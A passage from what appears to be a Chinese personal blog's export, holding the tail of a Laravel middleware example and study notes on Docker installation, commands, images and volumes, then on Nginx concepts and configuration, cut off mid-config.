class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">then</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$steps = [MFirstStepn];</span><br><span class="line">	$prepare = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;<span class="keyword">echo</span> <span class="string">&quot;请求向路由器传递，返回响应&quot;</span>；&#125;</span><br><span class="line">	$go = array_reduce($steps, ngoFunH, $prepare);</span><br><span class="line">	$go()；</span><br><span class="line">&#125;</span><br><span class="line">then ();</span><br><span class="line">输出：</span><br><span class="line">开启session，获取数据</span><br><span class="line">请求向路由器传递，返回响应</span><br><span class="line">保存数据，关闭session    </span><br></pre></td></tr></table></figure>
<h2 id="请求到响应的生命周期"><a class="markdownIt-Anchor" href="#请求到响应的生命周期"></a> 请求到响应的生命周期</h2>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>后端开发</tag>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker学习笔记</title>
    <url>/2020/06/27/Docker/</url>
    <content><![CDATA[<p><img src="/2020/06/27/Docker/docker.png" alt></p>
<a id="more"></a>
<h2 id="docker是什么"><a class="markdownIt-Anchor" href="#docker是什么"></a> Docker是什么</h2>
<p>将程序、开发环境、配置打包放到一个容器中，不需要在部署时进行环境的配置。解决了运行环境和配置问题软件容器，方便做持续集成并有助于整体发布的容器虚拟化技术。</p>
<p>Docker是基于Go语言实现的云开源项目。</p>
<p>Docker的主要目标是“Build，Ship and Run Any App，Anywhere”，也就是对应用组件进行封装、分发、部署、运行等生命周期的管理，使用户的APP（可以是一个WEB应用或数据库应用等等）及其运行环境能够做到“一次封装，到处运行”。</p>
<p><strong>Docker包含两方面技术：</strong></p>
<p>镜像技术：“镜像即应用”，（运行文档、配置环境、运行环境、运行依赖包、操作系统发行版、内核）</p>
<h2 id="docker能做什么"><a class="markdownIt-Anchor" href="#docker能做什么"></a> Docker能做什么</h2>
<h3 id="之前的虚拟机技术"><a class="markdownIt-Anchor" href="#之前的虚拟机技术"></a> 之前的虚拟机技术：</h3>
<p>虚拟机就是带环境安装的一种解决方案。</p>
<p>它可以在一种操作系统里面运行另一种操作系统，比如在Windows系统里面运行Linux系统。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响，这类虚拟机完美地运行了另一套系统，能够使应用程序，操作系统和硬件三者之间逻辑不变。</p>
<h3 id="容器虚拟化技术"><a class="markdownIt-Anchor" href="#容器虚拟化技术"></a> 容器虚拟化技术</h3>
<p>Linux发展出了另一种虚拟化技术：Linux容器（Linux Containers 简写为LXC）。</p>
<p><strong>Linux容器不是模拟一个完整的操作系统</strong>，而是对进程进行隔离。有了容器，就可以将软件运行时所需的所有资源打包到一个隔离的容器中。容器与虚拟机不同，不需要捆绑一整套操作系统，只需要将软件工作所需的库资源和设置。系统因此而变得高效轻量并保证部署在任何环境下的软件都能始终如一地运行。</p>
<h3 id="开发运维devops"><a class="markdownIt-Anchor" href="#开发运维devops"></a> 开发/运维（DevOps）</h3>
<p>开发者自己运维</p>
<p><strong>一次构建、随处运行</strong></p>
<h2 id="docker的安装"><a class="markdownIt-Anchor" href="#docker的安装"></a> Docker的安装</h2>
<h3 id="centos-docker安装"><a class="markdownIt-Anchor" href="#centos-docker安装"></a> CentOS Docker安装</h3>
<p>Docker支持以下的CentOS版本：</p>
<p>CentOS 7（64bit）</p>
<p>CentOS 6.5 （64bit）或更高版本</p>
<h3 id="前提条件"><a class="markdownIt-Anchor" href="#前提条件"></a> 前提条件</h3>
<p>目前，CentOS仅发行版中的内核支持Docker。</p>
<p>Docker运行在CentOS 7上，要求系统为64位，系统内核版本为3.10以上。</p>
<p>Docker运行在CentOS 6.5或更高版本的CentOS上，要求系统为64位，系统内核版本为2.6.32-431或者更高版本。</p>
<p>使用<code>uname -r</code>查看CentOS版本。</p>
<h3 id="docker的基本组成"><a class="markdownIt-Anchor" href="#docker的基本组成"></a> Docker的基本组成</h3>
<p><strong>镜像（image）<strong>就是一个</strong>只读</strong>的模板，镜像可以用来创建Docker容器，一个镜像可以创建很多容器。</p>
<p>**容器（container）**Docker利用容器独立运行的一个或一组应用。容器是镜像创建的运行实例。它可以被启动、开始、停止、删除。每个容器都是互相隔离的、保证安全的平台。</p>
<p>可以把容器看成是一个简易版的Linux环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。</p>
<p>容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的。</p>
<p>**仓库（repository）**是集中存放镜像文件的地方。仓库（repository）和仓库注册服务器（registry）是有区别的。仓库注册服务器上往往存放着多个仓库，每个仓库又包含了多个镜像，每个镜像有不同的标签（tag）。</p>
<h2 id="centos-7安装docker"><a class="markdownIt-Anchor" href="#centos-7安装docker"></a> CentOS 7安装Docker</h2>
<p><strong>使用命令查看CentOS的版本：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/redhat-release</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CentOS Linux release 7.3.1611 (Core) </span><br></pre></td></tr></table></figure>
<p><strong>安装gcc：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install gcc</span><br><span class="line">yum -y install gcc-c++</span><br></pre></td></tr></table></figure>
<p><strong>如果安装过Docker则需要删除软件包：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-engine</span><br></pre></td></tr></table></figure>
<p>如果未安装过Docker，则会有以下提示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Loaded plugins: fastestmirror</span><br><span class="line">No Match for argument: docker</span><br><span class="line">No Match for argument: docker-client</span><br><span class="line">No Match for argument: docker-client-latest</span><br><span class="line">No Match for argument: docker-common</span><br><span class="line">No Match for argument: docker-latest</span><br><span class="line">No Match for argument: docker-latest-logrotate</span><br><span class="line">No Match for argument: docker-logrotate</span><br><span class="line">No Match for argument: docker-engine</span><br><span class="line">No Packages marked for removal</span><br></pre></td></tr></table></figure>
<p><strong>安装Docker CE：</strong></p>
<p><strong>通过添加仓库安装：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y yum-utils</span><br><span class="line">sudo yum-config-manager \</span><br><span class="line">    --add-repo \</span><br><span class="line">    https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
<p>国外服务器太慢可以切换到阿里云的源：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager \ </span><br><span class="line">--add-repo \</span><br><span class="line">http://mirrors.aliyun.com/dockerce/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure>
<p>查看源文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/yum.repos.d/docker-ce.repo</span><br></pre></td></tr></table></figure>
<p>更新yum软件包索引：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum makecache fast</span><br></pre></td></tr></table></figure>
<p>安装Docker CE：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install docker-ce</span><br></pre></td></tr></table></figure>
<p>查看Docker版本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure>
<p>启动Docker：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
<p>首次运行hello world：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Unable to find image &#39;hello-world:latest&#39; locally</span><br><span class="line">latest: Pulling from library&#x2F;hello-world</span><br><span class="line">0e03bdcc26d7: Pull complete </span><br><span class="line">Digest: sha256:d58e752213a51785838f9eed2b7a498ffa1cb3aa7f946dda11af39286c3db9a9</span><br><span class="line">Status: Downloaded newer image for hello-world:latest</span><br><span class="line"></span><br><span class="line">Hello from Docker!</span><br><span class="line">This message shows that your installation appears to be working correctly.</span><br><span class="line"></span><br><span class="line">To generate this message, Docker took the following steps:</span><br><span class="line"> 1. The Docker client contacted the Docker daemon.</span><br><span class="line"> 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.</span><br><span class="line">    (amd64)</span><br><span class="line"> 3. The Docker daemon created a new container from that image which runs the</span><br><span class="line">    executable that produces the output you are currently reading.</span><br><span class="line"> 4. The Docker daemon streamed that output to the Docker client, which sent it</span><br><span class="line">    to your terminal.</span><br><span class="line"></span><br><span class="line">To try something more ambitious, you can run an Ubuntu container with:</span><br><span class="line"> $ docker run -it ubuntu bash</span><br><span class="line"></span><br><span class="line">Share images, automate workflows, and more with a free Docker ID:</span><br><span class="line"> https:&#x2F;&#x2F;hub.docker.com&#x2F;</span><br><span class="line"></span><br><span class="line">For more examples and ideas, visit:</span><br><span class="line"> https:&#x2F;&#x2F;docs.docker.com&#x2F;get-started&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看镜像：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">hello-world         latest              bf756fb1ae65        5 months ago        13.3kB</span><br></pre></td></tr></table></figure>
<p><strong>配置镜像加速：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /etc/docker</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">(配置网易云或者阿里云镜像加速)</span><br><span class="line"><span class="meta">#</span><span class="bash">网易</span></span><br><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;:[&quot;http://hub-mirror.c.163.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash">阿里云</span></span><br><span class="line">&#123;</span><br><span class="line">	&quot;registry-mirrors&quot;:[&quot;https://&#123;自己的编码&#125;.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>
<h2 id="docker运行底层原理"><a class="markdownIt-Anchor" href="#docker运行底层原理"></a> Docker运行底层原理</h2>
<p>（1）docker有着比虚拟机更少的抽象层，由于docker不需要Hypervisor实现硬件资源虚拟化，运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在效率上有明显优势。</p>
<p>（2）docker利用的是宿主机的内核，而不需要Guest OS。因此，当新建一个容器时，docker不需要和虚拟机一样重新加载一个操作系统内核。仍可避免引寻、加载操作系统内核返个比较费时费资源的过程，当新建一个虚拟机时，虚拟机软件需要加载Guest OS,返个新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统，则省略了返个过程，因此新建一个docker容器只需要几秒钟。</p>
<h2 id="docker常用命令"><a class="markdownIt-Anchor" href="#docker常用命令"></a> Docker常用命令</h2>
<h3 id="docker帮助命令"><a class="markdownIt-Anchor" href="#docker帮助命令"></a> Docker帮助命令</h3>
<p><strong>docker version</strong></p>
<p><strong>docker info</strong></p>
<p><strong>docker --help</strong></p>
<h3 id="docker镜像命令"><a class="markdownIt-Anchor" href="#docker镜像命令"></a> Docker镜像命令</h3>
<p><strong>docker images</strong></p>
<p>列出本地主机上的镜像。</p>
<p>选项说明：</p>
<p>-a：列出本地所有的镜像（含中间映像层）</p>
<p>-q：只显示镜像ID。</p>
<p>–digests：显示镜像的摘要信息。</p>
<p>–no-trunc：显示完整的镜像信息。</p>
<p><strong>docker search [OPTIONS] 镜像名字</strong></p>
<p>选项说明：</p>
<p>–no-trunc：显示完整的镜像描述</p>
<p>-s：列出收藏数不小于指定值的镜像。</p>
<p>–automated：只列出automated build类型的镜像</p>
<p><strong>docker pull [OPTIONS] 镜像名字 [:TAG]</strong></p>
<p><strong>docker rmi 删除某个镜像</strong></p>
<h3 id="docker容器命令"><a class="markdownIt-Anchor" href="#docker容器命令"></a> Docker容器命令</h3>
<p>**新建并启动一个容器：**docker run [OPTIONS] IMAGE [COMMAND] [ARG…]</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it centos</span><br></pre></td></tr></table></figure>
<p><strong>列出当前所有正在运行的容器</strong></p>
<p>docker ps [OPTIONS]</p>
<p>OPTIONS说明（常用）</p>
<p>-a：列出当前所有正在运行的容器+历史运行过的</p>
<p>-l：显示最近创建的容器</p>
<p>-n：显示最近n个创建的容器</p>
<p>-q：静默模式，只显示容器编号</p>
<p>–not-trunc：不截断输出</p>
<p><strong>退出容器</strong></p>
<p>exit：容器停止退出</p>
<p>ctrl+P+Q：容器不停止退出</p>
<p><strong>启动容器</strong></p>
<p>docker start 容器ID或者容器名</p>
<p><strong>重启容器</strong></p>
<p>docker restart 容器ID或者容器名</p>
<p><strong>停止容器</strong></p>
<p>docker stop 容器ID或者容器名</p>
<p><strong>强制停止容器</strong></p>
<p>docker kill 容器ID或者容器名</p>
<p><strong>删除容器</strong></p>
<p>docker rm 容器ID或者容器名</p>
<p><strong>一次性删除多个容器</strong></p>
<p>docker rm -f $(docker ps -a -q)</p>
<p>docker ps -a -1 | xargs docker rm</p>
<h3 id="重要命令"><a class="markdownIt-Anchor" href="#重要命令"></a> 重要命令</h3>
<p><strong>启动守护式容器：</strong></p>
<p>docker run -d</p>
<p><strong>查看容器日志：</strong></p>
<p>docker logs -f -t --tail 容器ID</p>
<p><strong>显示docker内部进程</strong></p>
<p>docker top 容器ID</p>
<p><strong>查看容器内部细节</strong></p>
<p>docker inspect 容器ID</p>
<p><strong>进入正在运行的容器并以命令行交互</strong></p>
<p>docker exex -it 容器ID bashShell</p>
<p>重新进入docker attach 容器ID</p>
<p><strong>上述两者区别：</strong></p>
<p>attach直接进入容器启动命令的终端，不会启动新的进程</p>
<p>exec是在容器中打开新的终端，并且可以启动新的进程</p>
<p><strong>从容器内拷贝文件到主机上</strong></p>
<p>docker cp 容器ID：容器内路径 目的主机路径</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker cp id: /tmp/log /root</span><br></pre></td></tr></table></figure>
<h2 id="docker镜像"><a class="markdownIt-Anchor" href="#docker镜像"></a> Docker镜像</h2>
<p>镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需的所有内容，包括代码、运行时、库、环境变量和配置文件。</p>
<h3 id="unionfs联合文件系统"><a class="markdownIt-Anchor" href="#unionfs联合文件系统"></a> UnionFS（联合文件系统）</h3>
<p>联合文件系统（Union File System）：2004年由纽约州立大学石溪分校开发，它可以把多个目录(也叫分支)内容联合挂载到同一个目录下，而目录的物理位置是分开的。UnionFS允许只读和可读写目录并存，就是说可同时删除和增加内容。UnionFS应用的地方很多，比如在多个磁盘分区上合并不同文件系统的主目录，或把几张CD光盘合并成一个统一的光盘目录(归档)。另外，具有写时复制(copy-on-write)功能UnionFS可以把只读和可读写文件系统合并在一起，虚拟上允许只读文件系统的修改可以保存到可写文件系统当中。</p>
<p>特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件叠加起来，这样最终的文件系统会包含所有底层的文件和目录。</p>
<h3 id="镜像加载原理"><a class="markdownIt-Anchor" href="#镜像加载原理"></a> 镜像加载原理</h3>
<p>rootfs和bootfs</p>
<p>任何程序运行时都会有依赖，无论是开发语言层的依赖库，还是各种系统lib、操作系统等，不同的系统上这些库可能是不一样的，或者有缺失的。为了让容器运行时一致，docker将依赖的操作系统、各种lib依赖整合打包在一起（即镜像），然后容器启动时，作为它的根目录（根文件系统rootfs），使得容器进程的各种依赖调用都在这个根目录里，这样就做到了环境的一致性。</p>
<p>不过，这时你可能已经发现了另一个问题：<strong>难道每开发一个应用，都要重复制作一次rootfs吗（那每次pull/push一个系统岂不疯掉）？</strong></p>
<p>比如，我现在用Debian操作系统的ISO做了一个rootfs，然后又在里面安装了Golang环境，用来部署我的应用A。那么，我的另一个同事在发布他的Golang应用B时，希望能够直接使用我安装过Golang环境的rootfs，而不是重复这个流程，那么本文的主角UnionFS就派上用场了。</p>
<p><strong>Docker镜像的设计中，引入了层（layer）的概念</strong>，也就是说，用户制作镜像的每一步操作，都会生成一个层，也就是一个增量rootfs（一个目录），这样应用A和应用B所在的容器共同引用相同的Debian操作系统层、Golang环境层（作为只读层），而各自有各自应用程序层，和可写层。启动容器的时候通过UnionFS把相关的层挂载到一个目录，作为容器的根文件系统。</p>
<p>需要注意的是，rootfs只是一个操作系统所包含的文件、配置和目录，并不包括操作系统内核。这就意味着，如果你的应用程序需要配置内核参数、加载额外的内核模块，以及跟内核进行直接的交互，你就需要注意了：<strong>这些操作和依赖的对象，都是宿主机操作系统的内核，它对于该机器上的所有容器来说是一个“全局变量”，牵一发而动全身。</strong></p>
<h3 id="docker镜像commit操作"><a class="markdownIt-Anchor" href="#docker镜像commit操作"></a> Docker镜像commit操作</h3>
<p>docker commit 提交容器副本使之成为新的镜像</p>
<p>docker commit -m=“提交的描述信息” -a=“作者” 容器ID 要创建的目标镜像名：[标签名]</p>
<p>docker run -it p 8080:8080 tomcat</p>
<h2 id="容器数据卷"><a class="markdownIt-Anchor" href="#容器数据卷"></a> 容器数据卷</h2>
<p>容器的持久化、容器间继承和共享数据。</p>
<h3 id="作用"><a class="markdownIt-Anchor" href="#作用"></a> 作用</h3>
<p>1.数据卷可在容器之间共享或重用数据</p>
<p>2.卷中的更改可以直接生效</p>
<p>3.数据卷中的更改不会包含在镜像的更新中</p>
<p>4.数据卷的生命周期一直持续到没有容器使用它为止</p>
<h3 id="容器内添加数据卷"><a class="markdownIt-Anchor" href="#容器内添加数据卷"></a> 容器内添加数据卷</h3>
<h4 id="直接命令添加"><a class="markdownIt-Anchor" href="#直接命令添加"></a> 直接命令添加</h4>
<p>docker run -it -v /宿主机绝对路径目录:/容器内目录 镜像名</p>
<p>命令（带权限）:docker run -it -v /宿主机绝对路径目录:/容器内目录:ro 镜像名  (read only)</p>
<h4 id="容器是否挂载成功"><a class="markdownIt-Anchor" href="#容器是否挂载成功"></a> 容器是否挂载成功</h4>
<p>docker inspect 容器ID 获取JSON格式的配置</p>
<p>Volumes字段</p>
<h3 id="dockerfile添加"><a class="markdownIt-Anchor" href="#dockerfile添加"></a> Dockerfile添加</h3>
<p>**Dockerfile:**描述镜像的文件</p>
<p>VOLUME:[&quot;/dataVoumeContainer&quot;,&quot;/dataVolumeContainer2&quot;,&quot;/dataVolumeContainer3&quot;]</p>
<p><strong>说明：</strong></p>
<p>出于可移植和分享的考虑，用-v 主机目录：容器目录这种方法不能够直接在Dockerfile里实现。</p>
<p>由于宿主机目录是依赖于特定宿主机的，并不能够保证在所有的宿主机上都存在这样的特定目录。</p>
<p><strong>步骤：</strong></p>
<p><strong>根目录下新建mydocker文件夹并进入</strong></p>
<p><strong>可在Dockerfile中使用VOLUME指令来给镜像添加一个或多个数据卷</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># volume test</span></span><br><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">&quot;dataVolumeContainer1&quot;</span>,<span class="string">&quot;/dataVolumeContainer2&quot;</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;fininsher,-------success1&quot;</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line">docker <span class="keyword">run</span><span class="bash"> -it -v /host1:/dataVolumeContainer1 -v /host2:/dataVolumeContainer2 centos /bin/bash</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>File构建</strong></p>
<p><strong>build后生成镜像 —获得一个新镜像</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker build -f &#x2F;mydocker&#x2F;dockerfile2 -t zzyy&#x2F;centos.</span><br></pre></td></tr></table></figure>
<p><strong>run容器</strong></p>
<p>通过上述步骤，容器内的卷目录地址已经知道对应的主机目录地址</p>
<p>Docker images ====&gt; DockerFile</p>
<h2 id="数据卷容器"><a class="markdownIt-Anchor" href="#数据卷容器"></a> 数据卷容器</h2>
<p>命名的容器挂载数据卷，其它容器通过挂载这个（父容器）实现数据共享，挂载数据卷的容器，称之为数据卷容器。</p>
<p>以上一步新建的镜像zzyy/centos为模板并运行容器dc01/dc02/dc03</p>
<p>它们已经有容器卷<code>/dataVolumeContainer1 /dataVolumeContainer2</code></p>
<p>容器间传递共享（–volumes-from）</p>
<p>先启动一个父容器dc01  在dataVolumeContainer2新增内容</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>服务器</tag>
        <tag>Docker</tag>
        <tag>后端开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx学习笔记</title>
    <url>/2020/06/26/Nginx/</url>
    <content><![CDATA[<p><img src="/2020/06/26/Nginx/nginx.png" alt></p>
<a id="more"></a>
<h2 id="nginx基本概念"><a class="markdownIt-Anchor" href="#nginx基本概念"></a> Nginx基本概念：</h2>
<p>一个高性能HTTP和反向代理web服务器，专为性能优化而开发。</p>
<p>**反向代理：**我么只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，再返回给客户端，此时反向代理服务器和目标服务器对外就是一个服务器，暴露的是代理服务器地址，隐藏了真实服务器IP地址。</p>
<p>正向代理：把局域网外的Internet想象成一个巨大的资源库，则局域网中的客户端要访问Internet，则需要通过代理服务器来访问，这种代理服务就称为正向代理。</p>
<p><strong>负载均衡：<strong>单个服务器解决不了，我们增加服务器的数量，然后将请求分发到各个服务器上，将原先请求集中到单个服务器上的情况改为将请求分发到多个服务器上，将负载分发到不同的服务器，也就是</strong>负载均衡</strong>。</p>
<p>**动静分离：**为了加快网站的解析速度，可以把动态页面和静态页面有不同的服务器来解析，加快解析速度，降低原来单个服务器的压力。</p>
<h2 id="nginx操作的常用命令"><a class="markdownIt-Anchor" href="#nginx操作的常用命令"></a> Nginx操作的常用命令：</h2>
<p>**查看nginx版本号：**nginx -v</p>
<p>**启动nginx：**nginx</p>
<p>**关闭nginx：**nginx -s stop</p>
<p>**重新加载命令：**nginx -s reload</p>
<h2 id="nginx配置文件"><a class="markdownIt-Anchor" href="#nginx配置文件"></a> Nginx配置文件：</h2>
<p><code>/etc/nginx/nginx.conf</code></p>
<h3 id="第一部分全局块"><a class="markdownIt-Anchor" href="#第一部分全局块"></a> 第一部分：全局块</h3>
<p>从配置文件开始到events块之间的内容，主要会设置一些影响nginx服务器整体运行的配置指令，主要包括配置运行nginx服务器的用户（组）、允许生成的worker process数，进程 PID 存放路径、日志存放路径和类型以及配置文件的引入等。</p>
<h3 id="第二部分event块"><a class="markdownIt-Anchor" href="#第二部分event块"></a> 第二部分：event块</h3>
<p>events块涉及的指令主要影响Nginx服务器与用户的网络连接，常用的设置包括是否开启对多work process下的网络连接进行序列化，是否允许同时接受多个网络连接，选取哪种事件驱动模型来处理连接请求，每个word process可以同时支持的最大连接数等。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>支持的最大连接数。</p>
<h3 id="第三部分http块"><a class="markdownIt-Anchor" href="#第三部分http块"></a> 第三部分：http块</h3>
<p>是Nginx服务器配置中最频繁的部分，代理、缓存和日志定义等绝大多数功能和第三方模块的配置都在这里。</p>
<p>http块也可以包括http全局块和server块。</p>
<p>**server块：**这和虚拟主机有密切关系，虚拟主机从用户角度看，和一台独立的硬件主机是完全一样的，该技术的忏悔说呢过是为了节省互联网服务器硬件成本。</p>
<p>每个http块可以包括多个server块，而每个server块就相当于一个虚拟主机。</p>
<p>而每个server块也分为全局server块，以及可以同时包含多个location块。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span> default_server;</span><br><span class="line">        <span class="attribute">listen</span>       [::]:<span class="number">80</span> default_server;</span><br><span class="line">        <span class="attribute">server_name</span>  </span><br><span class="line">        root         /usr/share/nginx/html;</span><br><span class="line">	<span class="attribute">default_type</span> <span class="string">&#x27;text/html&#x27;</span>;</span><br><span class="line">	<span class="attribute">charset</span> utf-<span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Load configuration files for the default server block.</span></span><br><span class="line"></span><br><span class="line">​        include /etc/nginx/default.d/*.conf;</span><br><span class="line"></span><br><span class="line">​        location / &#123;</span><br><span class="line">​		index index.html index.php index.htm;</span><br><span class="line">​		charset utf-8;</span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        error_page 404 /404.html;</span><br><span class="line">​            location = /40x.html &#123;</span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        error_page 500 502 503 504 /50x.html;</span><br><span class="line">​            location = /50x.html &#123;</span><br><span class="line">​        &#125;</span><br><span class="line">​	location ~ \.php$ &#123;</span><br><span class="line">​		fastcgi_pass 127.0.0.1:9000;</span><br><span class="line">​		fastcgi_index index.php;</span><br><span class="line">​		fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">​		include       fastcgi_params;</span><br><span class="line">​	&#125;</span><br><span class="line">​    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="详解"><a class="markdownIt-Anchor" href="#详解"></a> 详解：</h3>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#定义Nginx运行的用户和用户组</span></span><br><span class="line"><span class="attribute">user</span> www www; </span><br><span class="line"></span><br><span class="line"><span class="comment">#nginx进程数，通常设置成和cpu的数量相等</span></span><br><span class="line"><span class="attribute">worker_processes</span> <span class="number">4</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">#全局错误日志定义类型，[debug | info | notice | warn | error | crit]</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  notice;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  info;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#进程pid文件</span></span><br><span class="line"><span class="comment">#pid        logs/nginx.pid;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#指定进程可以打开的最大描述符：数目</span></span><br><span class="line"><span class="comment">#工作模式与连接数上限</span></span><br><span class="line"><span class="comment">##这个指令是指当一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（ulimit -n）与nginx进程数相除，但是nginx分配请求并不是那么均匀，所以最好与ulimit -n 的值保持一致。</span></span><br><span class="line"><span class="comment">#这是因为nginx调度时分配请求到进程并不是那么的均衡，所以假如填写10240，总并发量达到3-4万时就有进程可能超过10240了，这时会返回502错误。</span></span><br><span class="line"><span class="attribute">worker_rlimit_nofile</span> <span class="number">65535</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="comment">#参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型</span></span><br><span class="line">    <span class="comment">#是Linux 2.6以上版本内核中的高性能网络I/O模型，linux建议epoll，如果跑在FreeBSD上面，就用kqueue模型。</span></span><br><span class="line">    <span class="comment">#补充说明：</span></span><br><span class="line">    <span class="comment">#与apache相类，nginx针对不同的操作系统，有不同的事件模型</span></span><br><span class="line">    <span class="comment">#A）标准事件模型</span></span><br><span class="line">    <span class="comment">#Select、poll属于标准事件模型，如果当前系统不存在更有效的方法，nginx会选择select或poll</span></span><br><span class="line">    <span class="comment">#B）高效事件模型</span></span><br><span class="line">    <span class="comment">#Kqueue：使用于FreeBSD 4.1+, OpenBSD 2.9+, NetBSD 2.0 和 MacOS X.使用双处理器的MacOS X系统使用kqueue可能会造成内核崩溃。</span></span><br><span class="line">    <span class="comment">#Epoll：使用于Linux内核2.6版本及以后的系统。</span></span><br><span class="line">    <span class="comment">#/dev/poll：使用于Solaris 7 11/99+，HP/UX 11.22+ (eventport)，IRIX 6.5.15+ 和 Tru64 UNIX 5.1A+。</span></span><br><span class="line">    <span class="comment">#Eventport：使用于Solaris 10。 为了防止出现内核崩溃的问题， 有必要安装安全补丁。</span></span><br><span class="line">    <span class="attribute">use</span> <span class="literal">epoll</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#单个进程最大连接数（最大连接数=连接数+进程数）</span></span><br><span class="line">    <span class="comment">#根据硬件调整，和前面工作进程配合起来用，尽量大，但是别把cup跑到100%就行。</span></span><br><span class="line">    worker_connections  <span class="number">1024</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#keepalive 超时时间</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span> <span class="number">60</span>;</span><br><span class="line">    </span><br><span class="line">    <span 